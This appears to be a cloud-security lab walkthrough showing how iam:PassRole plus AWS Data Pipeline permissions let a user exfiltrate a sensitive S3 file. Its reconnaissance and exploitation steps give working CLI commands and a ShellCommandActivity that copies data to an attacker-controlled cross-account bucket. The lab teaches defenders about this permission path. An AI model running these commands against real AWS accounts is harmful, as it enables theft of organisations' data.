# Guided Walkthrough: Data Exfiltration via iam:PassRole + Data Pipeline

This scenario demonstrates how an attacker with `iam:PassRole` and Data Pipeline permissions can exfiltrate sensitive S3 data they have no direct IAM access to.

The critical vulnerability is a single compounding misconfiguration on the victim side: a user holds `iam:PassRole` on a role that has read access to a sensitive S3 bucket, combined with enough Data Pipeline permissions to launch arbitrary shell commands on EC2 instances. By passing that role to Data Pipeline, the attacker runs code as the pipeline role and reads the sensitive data, then ships it to attacker-controlled infrastructure.

The exfiltration bucket is **not** a victim misconfiguration. It is attacker-owned infrastructure, deployed in the attacker's own AWS account before the attack begins. Its bucket policy explicitly grants the victim account permission to write to it — something the attacker controls entirely.

## The Challenge

You start as `pl-prod-datapipeline-001-to-bucket-starting-user`, an IAM user with credentials provisioned by Terraform. Your permissions include `iam:PassRole` on the pipeline role and the three core Data Pipeline permissions (`CreatePipeline`, `PutPipelineDefinition`, `ActivatePipeline`).

Your goal is to read the contents of `pl-sensitive-data-datapipeline-001-{account_id}-{suffix}` — a bucket you have no direct IAM access to. To reach it, you'll need to pass the pipeline role to AWS Data Pipeline and have it execute a shell command on an EC2 instance that reads and ships the sensitive file to your attacker-controlled exfil bucket.

Key resources:
- Starting user: `arn:aws:iam::{account_id}:user/pl-prod-datapipeline-001-to-bucket-starting-user`
- Pipeline role: `arn:aws:iam::{account_id}:role/pl-prod-datapipeline-001-to-bucket-pipeline-role`
- Sensitive bucket (target): `arn:aws:s3:::pl-sensitive-data-datapipeline-001-{account_id}-{suffix}`
- Exfil bucket (attacker-controlled): `arn:aws:s3:::pl-exfil-bucket-datapipeline-001-{attacker_account_id}-{suffix}`

## Reconnaissance

First, confirm your identity and verify that direct access to the sensitive bucket is denied:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::123456789012:user/pl-prod-datapipeline-001-to-bucket-starting-user

aws s3 cp s3://pl-sensitive-data-datapipeline-001-123456789012-abc123/secret-data.txt -
# An error occurred (AccessDenied) ...
```

Good — you can't read the sensitive bucket directly. Now check what the pipeline role can do. Enumerate its policy:

```bash
aws iam get-role-policy \
    --role-name pl-prod-datapipeline-001-to-bucket-pipeline-role \
    --policy-name pl-prod-datapipeline-001-to-bucket-pipeline-policy
```

The role has `s3:GetObject` and `s3:ListBucket` on the sensitive bucket. Any EC2 instance running as this role can read from it. Before launching the pipeline, stage your exfil bucket in your own AWS account and set a resource policy that grants the victim account write access:

```json
{
  "Effect": "Allow",
  "Principal": { "AWS": "arn:aws:iam::VICTIM_ACCOUNT_ID:root" },
  "Action": "s3:PutObject",
  "Resource": "arn:aws:s3:::pl-exfil-bucket-datapipeline-001-ATTACKER_ACCOUNT-SUFFIX/*"
}
```

(In this lab, the exfil bucket is pre-staged by Terraform in the attacker account.)

## Exploitation

With the pipeline role's read access confirmed and your exfil bucket ready, create a Data Pipeline that passes the role to an EC2 instance and runs the exfiltration command.

### Step 1: Create the pipeline

```bash
PIPELINE_ID=$(aws datapipeline create-pipeline \
    --region us-east-1 \
    --name "pl-datapipeline-001-exfil-pipeline" \
    --unique-id "datapipeline-$(date +%s)" \
    --query 'pipelineId' \
    --output text)

echo "Pipeline ID: $PIPELINE_ID"
```

### Step 2: Define the pipeline with a ShellCommandActivity

Create the pipeline definition JSON. The `role` and `resourceRole` both point at the pipeline role. The `command` in the `ShellCommandActivity` performs the exfiltration cross-account:

```bash
PIPELINE_ROLE_ARN="arn:aws:iam::123456789012:role/pl-prod-datapipeline-001-to-bucket-pipeline-role"
SENSITIVE_BUCKET="pl-sensitive-data-datapipeline-001-123456789012-abc123"
EXFIL_BUCKET="pl-exfil-bucket-datapipeline-001-ATTACKER_ACCOUNT-abc123"

cat > /tmp/pipeline_definition.json << EOF
{
  "objects": [
    {
      "id": "Default",
      "name": "Default",
      "scheduleType": "ONDEMAND",
      "failureAndRerunMode": "CASCADE",
      "role": "$PIPELINE_ROLE_ARN",
      "resourceRole": "$PIPELINE_ROLE_ARN"
    },
    {
      "id": "ExfilActivity",
      "name": "ExfilActivity",
      "type": "ShellCommandActivity",
      "command": "aws s3 cp s3://$SENSITIVE_BUCKET/secret-data.txt s3://$EXFIL_BUCKET/exfiltrated.txt --region us-east-1",
      "runsOn": {
        "ref": "ExfilResource"
      }
    },
    {
      "id": "ExfilResource",
      "name": "ExfilResource",
      "type": "Ec2Resource",
      "instanceType": "t3.micro",
      "terminateAfter": "30 Minutes",
      "securityGroups": "default"
    }
  ]
}
EOF

aws datapipeline put-pipeline-definition \
    --region us-east-1 \
    --pipeline-id "$PIPELINE_ID" \
    --pipeline-definition file:///tmp/pipeline_definition.json
```

### Step 3: Activate the pipeline

```bash
aws datapipeline activate-pipeline \
    --region us-east-1 \
    --pipeline-id "$PIPELINE_ID"
```

Data Pipeline launches a `t3.micro` EC2 instance running as the pipeline role. The instance executes the `aws s3 cp` command. The read from the sensitive bucket succeeds via IAM (`s3:GetObject` is allowed on the pipeline role). The cross-account write to the exfil bucket succeeds because the attacker-controlled bucket's resource policy explicitly grants the victim account write access.

Wait approximately 60-90 seconds for the EC2 instance to launch and the shell command to complete.

## Verification

Once the pipeline has had time to execute, use your attacker-account credentials to confirm the exfiltrated data is present:

```bash
# Switch to attacker-account credentials
export AWS_PROFILE=attacker-account

# Check the exfil bucket for the output file
aws s3 ls s3://$EXFIL_BUCKET/exfiltrated.txt --region us-east-1

# Read the exfiltrated data
aws s3 cp s3://$EXFIL_BUCKET/exfiltrated.txt - --region us-east-1
```

You should see the contents of `secret-data.txt` from the sensitive bucket. Data exfiltrated.

## What Happened

The attack succeeded because of a single compounding misconfiguration on the victim side: the starting user held `iam:PassRole` on a role that had read access to a sensitive S3 bucket, combined with enough Data Pipeline permissions to run arbitrary shell commands on EC2 instances. That combination let the attacker reach data they had no direct IAM access to.

The exfil bucket is entirely attacker-controlled. The attacker staged it in their own account before the attack and configured it to accept writes from the victim account. This is standard attacker tradecraft — not a victim misconfiguration. Security reviews of the victim environment will find no misconfigured bucket on the victim side; the issue is entirely in the IAM permission set of the starting user and pipeline role.

The key lesson: `iam:PassRole` on a role that has access to sensitive data, combined with any compute service creation permission, is a data exfiltration path. The attacker does not need to escalate to admin; they only need to run code as the role.
